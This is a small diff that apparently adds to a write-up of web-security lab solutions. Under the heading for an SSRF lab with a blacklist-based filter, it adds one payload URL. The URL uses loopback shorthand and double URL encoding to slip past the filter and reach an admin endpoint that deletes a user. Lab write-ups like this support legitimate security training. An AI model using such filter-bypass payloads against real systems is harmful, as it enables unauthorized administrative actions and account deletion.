@@ -37,3 +37,6 @@ Write this payload into comment section:
 ```
 
 # [0x4] Lab: SSRF with blacklist-based input filter
+```
+http://127.1/%2561dmin/delete?username=carlos
+```
